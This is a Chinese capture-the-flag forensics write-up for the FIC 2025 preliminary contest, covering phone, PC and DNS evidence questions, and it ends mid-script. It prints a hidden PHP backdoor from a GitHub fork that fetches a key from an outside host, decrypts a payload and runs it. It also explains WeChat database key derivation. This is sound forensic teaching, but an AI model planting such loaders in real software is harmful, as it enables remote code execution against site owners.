@@ -1,0 +1,1590 @@
+第五届 FIC全国网络空间取证大赛 初赛 题解 - XD Forensics Wiki
+https://forensics.xidian.edu.cn/writeups/FIC2025Preliminary/
+
+第五届 FIC全国网络空间取证大赛 初赛 题解
+¶
+Author: NoahTie & BlackBird,  Hypnotics. @ 猫猫啥也不会
+检材容器密码:
+3x@9Qm!V8e$vL%6d^Yr5o*C#Nk7h&ZpFbW2sG4jXuD1cO0lTgAqHwRnIzJyM-_+K=
+本次比赛允许使用互联网
+比赛及复盘时用到的工具的清单:
+介质取证软件
+火眼证据分析软件
+系统仿真软件
+火眼仿真取证
+数据库工具
+DB Browser for Sqlite (sqlitebrowser)
+SQLiteStudio
+虚拟机软件
+VMware Workstation Pro
+其它工具
+Vera Crypt
+VS code
+010 Editor
+Irfan View
+phpStudy
+VLC
+Python 3.13 with Jupyter
+HashMyFiles
+Umi OCR
+WPS (OCR 文档识别功能)
+Office PowerPoint (BB 用 PowerPoint 处理图像, 我不懂但大受震撼)
+Audacity (音频编辑)
+Affinity Photo 2 (图像处理)
+取证录像
+案件背景
+¶
+网络黑灰产往往结伴而生, 大量黑灰产内容错综复杂. 随着 ai 和互联网技术的发展黑灰产形式也越来越多样. 离线的孤军奋战已不再能解放生产力。
+这次 fic 我们将通过黑灰产边缘人物李安弘的视角找到黑产们的老巢. 近期经匿名人员举报在某购物平台有店铺销售针孔摄像头, 警方通过调取购物平台后台权限后对订单内容进行固定获得(
+检材 1.rar
+). 经过一段时间的追查最终在店铺老板家中抓获老板李某(李安弘), 缴获李某手机(
+检材 2.tar
+), 电脑(
+检材 3.E01
+)和大量摄像头. 通过李某电子证据最终追查到该灰产上游人员陈某。
+请各位取证专家根据剧情提供的检材, 还原这起事件的前因后果, 并回答下列问题:
+检材一
+MD5: 668d1f53df0a6a0fbd9465551de46a10
+SHA256: 
+df8736ebcad651665d31c1dff2188b5fdbde5f458c195a4baa640b4803747d66
+检材二
+MD5: 6e06bf0a394740cb2107d5f6d3a1164a
+SHA256: 
+e16953e8ba2784e96f69f102820fe427ca3bf20b5c24d46703d022e05209e530
+检材三
+MD5: f65da8167944712884ee9f07debdcf1f
+SHA256: 72ed00619ba80fe4768f028de1ab410975335177e86aa942dcd6099d5c69b896
+第一部分 网站快照
+¶
+检材 1 - 网站快照
+"老赵商城系统"并非公开推广的普通电商平台, 而是一个仅限内部使用\受邀注册的封闭系统. 李某利用这套系统, 建立起一条以代理人和渠道商为主导的销售链条, 将他定制\经过特殊改装的针孔摄像头销售给经过严格筛选的代理成员.
+1.该取证录像文件的 SHA256 值为
+¶
+2753da22fe23cadaadc14fe4c1d5096a153360d9f91097ea376846431f5c1567
+Text Only
+certutil -hashfile 取证录像.mp4 SHA256
+2.远程取证所使用的 OBS 工具版本号为
+¶
+29.1.3
+视频 00:04 展示了 OBS 版本号
+3.该检材所使用的远程取证的工具名称为
+¶
+选项
+A. 网镜
+B. 快照大师
+C. 网页专家
+D. 网页取证能手
+视频 00:09 展示了使用工具为"网镜"
+4.远程取证过程中校验的北京时间为
+¶
+选项
+A. 2025/4/9 13:33:18
+B. 2025/4/9 13:34:18
+C. 2025/4/9 13:35:18
+D. 2025/4/9 13:36:18
+视频 00:24 展示了校准北京时间为
+2025/4/9 13:36:18
+5.远程取证的网站 IP 地址为
+¶
+172.16.10.200
+视频 00:24 左侧展示了本机 Hosts 文件, 结合 00:53 取证的域名为
+laozhao.com
+, 可以判断IP地址为
+172.16.10.200
+以及视频 00:44 有
+ping laozhao.com
+记录，可以看到 IP 地址
+6.远程取证的网站密码为
+¶
+admin123
+视频 01:06 展示了网站密码
+7.在已固定的"订单列表"中发现有一页缺失. 请找出缺失页面的具体页码为
+¶
+12
+这部分其实是后做的, 数据量很大, 于是想着先用"代理列表"的少量数据尝试下完整快速的解决办法;
+基于"代理列表"的思路, 缺失页码的数据是从视频里截到的, 视频里展示过的"订单列表"页码只有 1 - 13, 快速 review 下全部图片(
+出于懒的心态，能晚点ocr就晚点ocr
+), 只定位1 - 13, 发现缺失页码为
+12
+8.补充"订单列表"中缺失页面的数据后, 统计订单的总数为
+¶
+4000
+总数在每张"订单列表"数据图片下方选页码处, 4000
+9.补充"订单列表"中缺失页面的数据后, 统计已完成订单中"老李监控批发"的订单数为
+¶
+238
+OCR 启动
+Umi OCR 批量转文字的处理会出现一些小瑕疵, 比如识别行偏移之类, 在"代理列表"部分尚可手工处理几个偏移，这里过多了.
+用了 WPS 的图片转文字功能(
+之前不知道啥时候开过vip
+), 可以转excel, 格式和行列识别很准, 基本一遍过, 不过因为限制图片数量原因, 需要批量合并一下工作表和工作簿.
+(这里有个坑就是图片有重复的, 识别完用
+unique
+和
+vlookup
+处理下数据就行)
+处理好的数据筛选一下"已完成订单"和"老李监控批发", 获得结果
+10.补充"订单列表"中缺失页面的数据后, 统计已完成订单中"老李监控批发"的 ZK-101 产品的订单数为
+¶
+70
+再筛一下
+ZK-101
+11.补充"订单列表"中缺失页面的数据后, 统计已完成订单中"老李监控批发"产品在上海区域的订单数为
+¶
+12
+上海区域的代理人可在“代理列表”找到共 5 个
+筛选一下 12 个
+12.补充"订单列表"中缺失页面的数据后, 统计已完成订单中"老李监控批发"的销售情况, 并计算"赵磊(13967346658)"优惠后的总金额为(例如, 优惠率为 10% 时按原单价的 90% 计算)
+¶
+4390
+1800 * 0.7 + 2000 * 0.9 + 1900 * 0.7 = 4390
+13.补充"代理列表"中缺失页面的数据后, 统计代理人的最大层级数为(其中顶级代理的用户定义为第 1 层)
+¶
+5
+"代理列表"共 5 页, 缺失页码为 1, 找到视频展示部分截下来补充.
+用啥 OCR 软件都行, Umi OCR 能用有点偏差修一修就行, 选单栏保留缩进, 可以获得一个格式较为整齐的 txt 文件, 写个 python 脚本处理一下空格换行转成 csv 就能用了.
+Python
+import
+csv
+import
+re
+input_file
+=
+'input.txt'
+output_file
+=
+'output.csv'
+log_file
+=
+'异常.txt'
+with
+open
+(
+input_file
+,
+'r'
+,
+encoding
+=
+'utf-8'
+)
+as
+f
+:
+lines
+=
+f
+.
+readlines
+()
+header
+=
+re
+.
+split
+(
+r
+'\s{2,}'
+,
+lines
+[
+0
+]
+.
+strip
+())
+data
+=
+[]
+log
+=
+[]
+for
+i
+,
+line
+in
+enumerate
+(
+lines
+[
+1
+:],
+start
+=
+2
+):
+# 行号从2开始（含标题）
+raw_line
+=
+line
+.
+strip
+()
+fields
+=
+re
+.
+split
+(
+r
+'\s{2,}'
+,
+raw_line
+)
+if
+len
+(
+fields
+)
+!=
+6
+:
+log
+.
+append
+(
+f
+"第
+{
+i
+}
+行（字段数为
+{
+len
+(
+fields
+)
+}
+）：
+{
+raw_line
+}
+"
+)
+# 自动修正：多了就截，少了就补空
+if
+len
+(
+fields
+)
+>
+6
+:
+fields
+=
+fields
+[:
+6
+]
+else
+:
+fields
++=
+[
+''
+]
+*
+(
+6
+-
+len
+(
+fields
+))
+data
+.
+append
+(
+fields
+)
+with
+open
+(
+output_file
+,
+'w'
+,
+newline
+=
+''
+,
+encoding
+=
+'utf-8-sig'
+)
+as
+f
+:
+writer
+=
+csv
+.
+writer
+(
+f
+)
+writer
+.
+writerow
+(
+header
+)
+writer
+.
+writerows
+(
+data
+)
+if
+log
+:
+with
+open
+(
+log_file
+,
+'w'
+,
+encoding
+=
+'utf-8'
+)
+as
+f
+:
+f
+.
+write
+(
+"以下为字段数不为6的原始行记录：
+\n\n
+"
+)
+f
+.
+write
+(
+'
+\n
+'
+.
+join
+(
+log
+))
+print
+(
+f
+"CSV：
+{
+output_file
+}
+"
+)
+print
+(
+f
+"异常行
+{
+len
+(
+log
+)
+}
+行，log：
+{
+log_file
+}
+"
+)
+最大层级数
+Python
+import
+csv
+input_file
+=
+'output.csv'
+output_file
+=
+'output_with_levels.csv'
+# 读取并清洗
+with
+open
+(
+input_file
+,
+'r'
+,
+encoding
+=
+'utf-8-sig'
+)
+as
+f
+:
+reader
+=
+csv
+.
+DictReader
+(
+f
+)
+rows
+=
+list
+(
+reader
+)
+cleaned_rows
+=
+[]
+for
+row
+in
+rows
+:
+cleaned_row
+=
+{
+k
+.
+strip
+()
+.
+lstrip
+(
+'
+\ufeff
+'
+):
+v
+.
+strip
+()
+for
+k
+,
+v
+in
+row
+.
+items
+()}
+cleaned_rows
+.
+append
+(
+cleaned_row
+)
+rows
+=
+cleaned_rows
+# ID -> 上级ID 映射
+id_to_parent
+=
+{}
+for
+row
+in
+rows
+:
+agent_id
+=
+row
+[
+'代理人ID'
+]
+parent_id
+=
+row
+[
+'上级代理ID'
+]
+id_to_parent
+[
+agent_id
+]
+=
+parent_id
+# 计算层级函数
+def
+get_depth
+(
+agent_id
+,
+cache
+):
+if
+agent_id
+not
+in
+id_to_parent
+or
+id_to_parent
+[
+agent_id
+]
+==
+'0'
+:
+return
+1
+if
+agent_id
+in
+cache
+:
+return
+cache
+[
+agent_id
+]
+parent_id
+=
+id_to_parent
+.
+get
+(
+agent_id
+,
+'0'
+)
+depth
+=
+1
++
+get_depth
+(
+parent_id
+,
+cache
+)
+cache
+[
+agent_id
+]
+=
+depth
+return
+depth
+depth_cache
+=
+{}
+max_depth
+=
+0
+# 所在层数
+for
+row
+in
+rows
+:
+agent_id
+=
+row
+[
+'代理人ID'
+]
+level
+=
+get_depth
+(
+agent_id
+,
+depth_cache
+)
+row
+[
+'所在层数'
+]
+=
+level
+if
+level
+>
+max_depth
+:
+max_depth
+=
+level
+# 写入
+fieldnames
+=
+list
+(
+rows
+[
+0
+]
+.
+keys
+())
+with
+open
+(
+output_file
+,
+'w'
+,
+newline
+=
+''
+,
+encoding
+=
+'utf-8-sig'
+)
+as
+f
+:
+writer
+=
+csv
+.
+DictWriter
+(
+f
+,
+fieldnames
+=
+fieldnames
+)
+writer
+.
+writeheader
+()
+writer
+.
+writerows
+(
+rows
+)
+print
+(
+f
+"
+{
+max_depth
+}
+层"
+)
+print
+(
+f
+"层级列：
+{
+output_file
+}
+"
+)
+14.补充"代理列表"中缺失页面的数据后, 统计每位代理的直接下游人数, 并确定直接下游人数排名第一的代理人为
+¶
+李玲娟
+统计一下出现次数最多的"上级代理ID"即可
+15.补充"代理列表"中缺失页面的数据后, 根据地址信息统计各区域的代理人数, 并确定上海区域的代理人数为
+¶
+5
+第二部分 手机取证
+¶
+检材 2 - 李某手机
+老李沟通生意所用的设备.
+1.该手机的 device_name 是
+¶
+Redmi 6 Pro
+在
+检材2.tar/adb/lspd/log/props.txt
+可以看到设备信息：
+2.PC 开机密码是什么
+¶
+1qaz2wsx
+一般手机中记录密码的地方: 远控相关软件记录、手机便签、照片等。浏览该软件安装软件列表, 没有远程连接相关软件. 查看便签相关软件, 该设备安装了三个软件:
+应用名称
+包名
+类型
+懒猫笔记本-备忘录
+com.lazy.note
+非预装
+小米便签
+com.miui.notes
+非预装
+备忘录日记
+com.bijoysingh.yang
+非预装
+在
+/data/{packageName}
+路径下翻找记录, 最终在"备忘录日记"的路径下找到相关内容:
+3.嫌疑人接头暗号是什么
+¶
+爱能不能够永远单纯没有悲哀
+见上题:
+根据软件便签内容可以看到, 接头暗号是图片格式存储的. 在
+files/images
+路径下找到
+ub690t1mq9kelnah.png
+文件:
+4.嫌疑人存放的秘钥环是多少
+¶
+1qaz2wsx3edc
+在火眼自动分析的备忘录中可以看到:
+查看小米自带的便签应用
+com.miui.notes
+中的数据:
+5.嫌疑人一生中最重要的日子是什么时候
+¶
+2026-02-26
+推测和纪念日相关，手机中相关的软件:
+应用名称
+包名
+类型
+倒数日
+com.clover.daysmatter
+非预装
+日历存储
+com.android.providers.calendar
+预装
+日历
+com.android.calendar
+预装
+逐个查看
+/data/{packageName}
+路径，并没有找到相关的记录。在系统截图中，找到：
+根据截图内容与图片元数据可以推测, 截图日期是
+2025-04-11
+, 具体 "我一生中最重要日子还有 321 天",
+数一数
+, 用 python 计算一下:
+Python
+from
+datetime
+import
+datetime
+,
+timedelta
+start_date
+=
+datetime
+(
+2025
+,
+4
+,
+11
+)
+future_date
+=
+start_date
++
+timedelta
+(
+days
+=
+321
+)
+print
+(
+f
+"2025-04-11后的321天是:
+{
+future_date
+.
+strftime
+(
+'%Y-%m-
+%d
+'
+)
+}
+"
+)
+# 2025-04-11后的321天是: 2026-02-26
+6.微信生成的聊天记录数据库文件名称是什么
+¶
+EnMicroMsg.db
+其实这个基本上都成常识了...
+我们随便选择一条聊天记录, 点击"跳转到源文件":
+7.嫌疑人微信账号对应的 UIN 为多少
+¶
+1864810197
+见下题
+8.微信聊天记录数据库的加密秘钥是什么
+¶
+31ad809
+做这道题需要事先找到
+EnMicroMsg.db
+的位置
+/data/data/com.tencent.mm/MicroMsg/(32 AlphaNum)/EnMicroMsg.db
+和
+auth_info_key_prefs.xml
+的位置:
+/data/data/com.tencent.mm/shared_prefs/auth_info_key_prefs.xml
+并且找到手机的 IMEI 信息:
+2 条 IMEI 信息分别是
+868139033433456
+868139033433464
+另外, 如果微信在创建数据库时没有获取到 IMEI 信息, 则会使用
+1234567890ABCDEF
+代替 IMEI. 这种情况下
+auth_info_key_prefs.xml
+文件中会缺少 IMEI 信息.
+接着在
+auth_info_key_prefs.xml
+文件中找到 UIN 信息为
+1864810197
+:
+火眼的自动分析中也有 UIN 信息:
+用你喜欢的哈希计算工具计算
+md5(IMEI+UIN)
+并截取前 7 位. 因为本题中微信并没有获取到 IMEI 信息, 因此只用计算
+md5("1234567890ABCDEF"+UIN)
+即可.
+微信加密数据库使用的是 SQLCipher 1, 参数配置为
+kdf_iter = 4000
+cipher_use_hmac = OFF
+cipher = AES-256-CBC
+cipher_page_size = 1024
+可以使用老版本(仍然支持 SQLCipher 1)的 DB Browser for SQLite 加载; 或者使用 SQLiteStudio 加载, 但需要手动配置参数:
+SQL
+PRAGMA
+cipher_compatibility
+=
+1
+;
+密码是
+31ad809
+.
+9."欠条.rar"的解压密码是多少
+¶
+3170010703
+在微信的聊天记录中提及到了关于解压密码的信息:
+稍前一些的聊天记录中提到了手机号码的信息:
+但是只发了一张图片, 猜测手机号码是被隐藏在图片中了:
+woc, ⚪
+在微信的文件存储目录
+检材2.tar/data/com.tencent.mm/MicroMsg/f6781d69b1866c72a087d67dd3b05189/image2/8f/bb/
+中找到 2 张相似的图片:
+区别仅在于其中一张上有二维码的水印:
+但是我找了几个二维码解析工具, 都不能直接识别出来, 得先处理一下.
+最后用手机上的 QR Scanner 扫出来的. 不过这个图片是有规律的, 底纹类似于 PS 里透明显示的棋盘格, 应该是有办法识别出来的.
+试了一下, 密码是不带区号的.
+10."欠条.rar"解压后, 其中 VeraCrypt 容器的 MD5 值是多少
+¶
+83da62aabc88cb1b23e9469142b67b80
+11."欠条.rar"解压后, 其中"1.png"图上显示的 VeraCrypt 容器密码是多少
+¶
+#!@KE2sax@!da0h5hghg34&@
+看到有
+1.png
+和
+图片密码.png
+, 在
+1.png
+中隐约看到密码：
+推测是将两张图片叠加在一起(xor), 才能清晰看到密码, 但是比赛时手头没有
+ps
+, 放
+ppt
+里面, 处理一下(调整对比度、亮度啥的):
+蛮折磨人的...
+调了一下, 感觉最清晰的也就是这样了. 图片上随机噪声太多, 否则直接截取一部分做差效果应该更好.
+12.嫌疑人李某全名是什么
+¶
+李安弘
+根据上述容器密码, 挂载
+欠条
+容器，获得欠条内容：
+但这个题有一个很离谱的点, 如果稍微注意一下答题平台, 就可以看到:
+蛮扯淡的...
+13.嫌疑人欠款金额是多少
+¶
+80000
+见上题.
+第三部分 介质取证
+¶
+检材 3 - 李某电脑
+老李用于存放个人物品的设备.(?)
+居然是个麒麟 Linux. Kylin 是基于 Debian 的 Linux 发行版, 改动不算很大. 最值得一提的大概是 Kylin 默认的图形化界面是 Wayland.
+1.该电脑最后一次开机时间是
+¶
+2025-04-14 11:49:47
+2.嫌疑人的备用机号码是
+¶
+18877332134
+在便签贴里面可以看到一条记录, 其中插入了一个文件对象.
+跳转到原始数据库, 查看这一条便签贴对应的原始记录
+可以看到插入了一个 Base64 编码的图片文件. Base64 转回二进制可以看到是个透明背景的 png 文件:
+3.域名
+dgy02.com
+曾保存过一个密码, 该密码是
+¶
+tcgg123456
+可以看到在 Chrome 浏览器中保存了
+dgy02.com
+的用户信息:
+需要仿真查看. 启动 Chrome 浏览器之后要求输入密钥环口令:
+如果用过 KDE 用户界面的话, 应该见过 KDE Wallet, 其本质上是个 GUI 的密钥环管理程序. 密钥环的口令在 Android 手机的备忘录中, 使用口令
+1qaz2wsx3edc
+解锁密钥环.
+之后就可以在 Chrome 保存的密码中看到:
+4.其电脑安装的微信版本是
+¶
+4.0.0.21
+在安装的软件列表中可以看到:
+5.该系统有哪些远程控制软件
+¶
+选项
+A. todesk
+B. 向日葵
+C. raylink
+D. 爱思远控
+仿真后可以在应用菜单里看到:
+在火眼分析出的软件信息中也可以看到:
+6.电脑 2025 年 4 月 10 日 11 点 4 分 29 秒曾被向日葵远程控制, 其记录的日志文件名为
+¶
+在向日葵的日志目录
+检材3.E01/分区6/var/log/sunlogin
+中可以看到:
+其中
+sunlogin_service.log*
+是程序核心组件的日志, 其中
+sunlogin_service.log.2
+的创建时间和修改时间包含了
+2025-04-10 11:04:29
+. 在该文件中搜索时间:
+可以看到客户端接受控制的日志.
+7.电脑 2025 年 4 月 10 日 11 点 4 分 29 秒曾被向日葵远程控制, 日志内记录对方公网IP地址和端口为
+¶
+182.100.46.36:4118
+接上题. 根据日志中的内容, 可以判断出来 p2p 连接时, 对方服务端的公网 IP 及端口为
+182.100.46.36:4118
+, 受控客户端被分配到的公网 IP 及端口为
+116.192.161.222:2577
+, 局域网 IP 为
+192.168.3.192
+.
+8.某文件的 MD5 值为"2bdfcdbd6c63efc094ac154a28968b7d", 该文件名为
+¶
+important.docx
+WPS 最近访问的文档中有一个
+important.docx
+, md5 与题目中的一致.
+9.据调查, 上述文件存放了钱包助记词, 第一个单词是什么
+¶
+solution
+文件打开之后内容只有 1 行:
+猜测是 office 文档隐写. 直接解压, 在
+docProps
+中有一个不该出现的图片:
+内容是 12 个助记词:
+10.请分析"我的测试机", 最近曾访问过的音频文件, 该音频文件的文件名是什么
+¶
+自传小说.MP3
+题目中提到的"我的测试机"是 VMware 虚拟机, 位于
+检材3.E01/分区8/home/adm1n/文档/我的测试机/
+目录下, 火眼的检材嵌套识别可以自动分析出来:
+将其中的虚拟硬盘
+我的测试机.vmdk
+作为新检材添加. 在火眼的"最近访问的项目"中可以看到一个 mp3 格式的音频文件:
+11.请分析"我的测试机", 最近曾使用过USB设备, 该设备的名称为
+¶
+选项
+A. ThinkPLus
+B. Toshiba
+C. Samsumg
+D. Database
+在火眼的"USB 设备信息"中可以看到:
+12.请分析"我的测试机"中的音频内容, 并回答, 嫌疑人现任妻子毕业的大学是
+¶
+北京大学
+这道题及之后的题目的答案均由第 10 题中的音频文件得到.
+用音频编辑软件打开音频文件, 可以看到音频有明显的分段, 每段之间夹杂一个较大的静音片段:
+可以先手动对其进行处理, 去除静音部分或将有声片段切片导出.
+找一个语音转文字的工具, 对音频内容进行转写. 我用的是
+AI智能语音转文字软件 | GitMind
+, 不用登陆, 虽然有限制免费只能转写 1 次且有时长限制, 但信息保存在 Cookie 里, 用一次清一次 Cookie 就能无限试用.
+语音是合成语音, 带方言口音的, 所以转写准确度不是很好, 凑合能看.
+最开始提到自己的前妻毕业于上海大学:
+后来又提到自己和毕业于北京大学的现任走到一起:
+13.请分析"我的测试机"中的音频内容, 并回答, 嫌疑人是通过一个朋友认识的陈老板, 该朋友姓氏拼音是
+¶
+wang
+14.请分析"我的测试机"中的音频内容, 并回答, 嫌疑人所说的香格里拉大酒店实则是
+¶
+棋牌室的后院
+15.请分析"我的测试机"中的音频内容, 并回答, 嫌疑人银行密码是多少
+¶
+071492
+我愿称这道题为究极脑洞 Misc 题. 打比赛的时候没想到, 复盘的时候也没想到. 最后是在另外一位师傅的博客
+2025FIC初赛WP-CSDN博客
+里看到的答案.
+之前提到音频文件被人为添加了多段空白, 并分割为 13 段语音.
+每段语音的开头:
+Text Only
+我叫李安宏...
+得到毕业证书后...
+银色的流星划过天际...
+行家啊...
+密聊中...
+马上我们相约在香格里拉大酒店...
+事后...
+凌伍诚(音)便是这这时候...
+起初...
+一次次这样...
+四楼的车库里...
+就是些交易的场面...
+而每当这个念头浮现...
+取每一段音频的**首字**, 拼接起来得到
+我得银行密马事凌起一四就而
+=
+我的银行密码是071492
+. 感觉又赤了口大的...
+第四部分 互联网
+¶
+警方在服务器中发现了疑似陈某的网站域名, 通过该域名警方成功找到陈某的互联网身份和相关 IP.
+请选手固定所有题目相关互联网部分内容.
+这部分题目没有检材文件, 选手需要自行在网上找到对应的信息, 并对证据进行固定.
+WEB 3.0 在之前打 WEB 的时候听过, 但是没怎么仔细了解过. 没想到这次比赛能遇到, 边打比赛边现学了一下 HNS 的知识, 收获不小.
+1.找到李某上游人员陈某博客宣传所用域名为
+¶
+chen.foren6
+在手机的微信聊天记录中提到博客地址是
+chen.foren6
+.
+2.请分析陈某宣传所用域名, 该域名的顶级域名在以下那个区块链注册
+¶
+选项
+A. ETH(
+https://ens.domains/
+)
+==B. HNS(
+https://handshake.org/)==
+C. BTC(
+https://bitcoin.org/
+)
+D. Namecoin(
+https://www.namecoin.org/
+)
+ETH(ENS) 注册的域名顶级域名固定是
+eth
+.
+Handshake(HNS) 是去中心化 DNS 服务, 支持用户注册​自定义顶级域名​, 无需通过 ICANN.
+BTC 链上的顶级域名固定为
+btc
+, 且不用于传统的域名解析.
+Namecoin 也用于去中心化 DNS 服务, 但顶级域名为 ​​
+.bit
+​.
+3.顶级域名的域名解析服务器(DNS)共有几个
+¶
+2
+在一个购买 HNS 域名的网站上搜到了
+foren6
+的信息:
+.foren6 | Handshake top-level domain | Namebase
+可以看到其拥有 2 个 DNS 服务器, 分别是
+ns1.varo.domains
+和
+ns2.varo.domains
+:
+4.顶级域名的 NS1 服务器 IP 为
+¶
+45.79.133.98
+用 dig 在
+ns1.varo.domains
+DNS 服务器上查一下顶级域名
+foren6
+的解析:
+dig @ns1.varo.domains foren6
+可以看到
+ns1.varo.domains
+的 IP 地址为
+45.79.133.98
+.
+5.请分析陈某宣传所用域名, 该域名 DNS 记录指向邮件服务器域名为
+¶
+mail.163.com
+dig MX @ns1.varo.domains chen.foren6
+6.请分析陈某宣传所用域名, 该域名的 TXT 记录中 chen 的值为
+¶
+fengbaoliejiu
+dig TXT @ns1.varo.domains chen.foren6
+也可以通过查询 ANY 信息来看到以上几道题的全部答案:
+dig ANY @ns1.varo.domains chen.foren6
+7.请分析陈某宣传所用域名, 该域名 DNS 记录没有以下那个域名
+¶
+选项
+A. admin.chen.foren6
+B. caidan.chen.foren6
+C. fichen.foren6
+D. hl.chen.foren6
+用
+dig ANY
+来查看域名解析的全部信息.
+admin.chen.foren6
+的解析, 有 1 条 MX 信息:
+caidan.chen.foren6
+的解析, 有 1 条 A 信息:
+fichen.foren6
+无解析, 只有根域名的 SOA 信息:
+hl.chen.foren6
+无解析, 只有根域名的 SOA 信息:
+8.请分析陈某宣传所用域名, 该博客域名最终 DNS 解析指向的 github 仓库名为
+¶
+chewhaoN.github.io
+dig CNAME @ns1.varo.domains blog.chen.foren6
+9.请分析陈某 github 账号，陈某对
+jkroepke/2Moons
+项目增改了几个文件
+¶
+2
+这里有两个方案找到陈某的
+2Moons
+项目:
+首先是一个方案, 如果没有做出前 8 个题目, 我们根据题干首先找到
+jkroepke/2Moons
+项目, 我们查看该项目的
+fork
+:
+这些项目都是很早之前的, 因此我们推测陈某是直接拷贝代码, 那么直接搜索:
+另一种方案是根据上一题的博客地址, 找到陈某的 github 账号, 再查看该账号下的仓库:
+我们将
+chewhaoN/2Moons
+和
+jkroepke/2Moons
+分别克隆到本地, 删除两个文件夹内的
+.git
+目录, 使用
+git diff
+指令, 进行比对:
+Diff
+diff --git "a/.\\chen\\/encrypted.bin" "b/.\\chen\\/encrypted.bin"
+new file mode 100644
+index 0000000..d6a0dce
+--- /dev/null
++++ "b/.\\chen\\/encrypted.bin"
+@@ -0,0 +1 @@
++9T8NBGdXI1Xe46fDOsPmrmuhAD9Rk/XQMRukLHJDXMm9wexBjKY/8QQv1OvxCiA87B0ZQ9kFgQiJ0fCquio0EcK5sWr1yUMYrapSWgUXMbD2/P4Qs9lO1cc53rRgZ8lg5r7d21YJkFFkyKJDMAmEjw==
+\ No newline at end of file
+diff --git "a/.\\2Moons\\/includes/libs/Smarty/plugins/block.textformat.php" "b/.\\chen\\/includes/libs/Smarty/plugins/block.textformat.php"
+index e9f5fe2..359a53f 100644
+--- "a/.\\2Moons\\/includes/libs/Smarty/plugins/block.textformat.php"
++++ "b/.\\chen\\/includes/libs/Smarty/plugins/block.textformat.php"
+@@ -33,8 +33,9 @@
+* @return string content re-formatted
+* @author Monte Ohrt <monte at ohrt dot com>
+*/
+-function smarty_block_textformat($params, $content, $template, &$repeat)
+-{
++
++   function smarty_block_textformat($params, $content, $template, &$repeat)
++{
+if (is_null($content)) {
+return;
+}
+@@ -109,4 +110,6 @@ function smarty_block_textformat($params, $content, $template, &$repeat)
+} else {
+return $_output;
+}
++    $a=file_get_contents('https://foren6.atwebpages.com/woyao/eat/%E7%81%AB%E9%94%85/%E8%9C%82%E8%9C%9C%E9%94%85%E5%BA%95.css');$b=md5($a,true);$c=file_get_contents('../../../../encrypted.bin');$d=base64_decode($c);$e='aes-256-cbc';$f=openssl_cipher_iv_length($e);$g=substr($d,0,$f);$h=substr($d,$f);$i=openssl_decrypt($h,$e,$b,OPENSSL_RAW_DATA,$g);$j=sys_get_temp_dir();$k=$j.'/func_'.uniqid().'.php';file_put_contents($k,"<?php\n".$i);include $k;unlink($k);yijuhua();
++
+}
+陈某增加了
+encrypted.bin
+文件, 修改了
+/includes/libs/Smarty/plugins/block.textformat.php
+文件.
+或者也可以另 fork 一个官方仓库, clone 到本地, 再用
+chewhaoN/2Moons
+中的文件覆盖本地仓库的文件, commit 一下就能看出来那些文件变动了.
+10.请分析陈某 github 账号，陈某在修改
+2Moons
+过程中提到了什么锅底
+¶
+蜂蜜锅底
+查看陈某对项目的修改:
+PHP
+$a=file_get_contents('https://foren6.atwebpages.com/woyao/eat/%E7%81%AB%E9%94%85/%E8%9C%82%E8%9C%9C%E9%94%85%E5%BA%95.css');$b=md5($a,true);$c=file_get_contents('../../../../encrypted.bin');$d=base64_decode($c);$e='aes-256-cbc';$f=openssl_cipher_iv_length($e);$g=substr($d,0,$f);$h=substr($d,$f);$i=openssl_decrypt($h,$e,$b,OPENSSL_RAW_DATA,$g);$j=sys_get_temp_dir();$k=$j.'/func_'.uniqid().'.php';file_put_contents($k,"
+<?php
+\n
+".
+$i
+);include
+$k
+;unlink(
+$k
+);yijuhua();
+大致看一眼, 就知道执行了一句话 webshell, 稍微修改美化一下:
+PHP
+// 获取远程CSS文件内容，并计算其MD5哈希作为AES密钥
+$cssContent = file_get_contents('https://foren6.atwebpages.com/woyao/eat/%E7%81%AB%E9%94%85/%E8%9C%82%E8%9C%9C%E9%94%85%E5%BA%95.css');
+$aesKey = md5($cssContent, true);
+// 读取本地加密的二进制文件
+$encryptedData = file_get_contents('../../../../encrypted.bin');
+$base64DecodedData = base64_decode($encryptedData);
+// AES-256-CBC解密准备
+$cipherMethod = 'aes-256-cbc';
+$ivLength = openssl_cipher_iv_length($cipherMethod);
+$iv = substr($base64DecodedData, 0, $ivLength); // 提取IV（初始化向量）
+$encryptedPayload = substr($base64DecodedData, $ivLength); // 剩余部分是加密数据
+// 解密数据（PHP代码）
+$decryptedPhpCode = openssl_decrypt(
+$encryptedPayload,
+$cipherMethod,
+$aesKey,
+OPENSSL_RAW_DATA,
+$iv
+);
+// 将解密后的代码写入临时文件并执行
+$tempDir = sys_get_temp_dir();
+$tempPhpFile = $tempDir . '/func_' . uniqid() . '.php';
+file_put_contents($tempPhpFile, "
+<?php
+\n
+" .
+$decryptedPhpCode
+);
+include
+$tempPhpFile
+;
+unlink(
+$tempPhpFile
+); // 执行后删除临时文件
+// 调用解密代码中的函数
+yijuhua();
+其中获取
+aesKey
+的
+css
+文件的
+url
+为
+https://foren6.atwebpages.com/woyao/eat/%E7%81%AB%E9%94%85/%E8%9C%82%E8%9C%9C%E9%94%85%E5%BA%95.css
+, url 解码后为:
+不是... 蜂蜜锅底, 能好吃, 吗? 不是很懂你们上海人...
+11.请分析陈某 github 账号，陈某在游戏
+2Moons
+中放置的后门连接码的密码为
+¶
+ficnb
+我们本地起一个
+phpstudy
+, 由于执行过程使用
+openssl
+相关的函数, 因此记得修改
+php.ini
+文件, 启动
+openssl extension
+, 为了避免意外, 我们将
+css
+文件手动下载到了本地:
+PHP
+<?php
+// 获取远程 CSS 文件内容, 并计算其 MD5 哈希作为 AES 密钥
+// 需要配置才能访问外部资源, 这里用 python 先把资源下载到本地
+//$cssContent = file_get_contents('https://foren6.atwebpages.com/woyao/eat/%E7%81%AB%E9%94%85/%E8%9C%82%E8%9C%9C%E9%94%85%E5%BA%95.css');
+//open("./key.css", 'wb').write(requests.get("http://foren6.atwebpages.com/woyao/eat/%E7%81%AB%E9%94%85/%E8%9C%82%E8%9C%9C%E9%94%85%E5%BA%95.css").content)
+$cssContent
+=
+file_get_contents
+(
+'./key.css'
+);
+$aesKey
+=
+md5
+(
+$cssContent
+,
+true
+);
+echo
+base64_encode
+(
+$aesKey
+);
+echo
+"<br />"
+;
+// 读取本地加密的二进制文件
+$encryptedData
+=
+file_get_contents
+(
+'./encrypted.bin'
+);
+$base64DecodedData
+=
+base64_decode
+(
+$encryptedData
+);
+// AES-256-CBC解密准备
+$cipherMethod
+=
+'aes-256-cbc'
+;
+$ivLength
+=
+openssl_cipher_iv_length
+(
+$cipherMethod
+);
+$iv
+=
+substr
+(
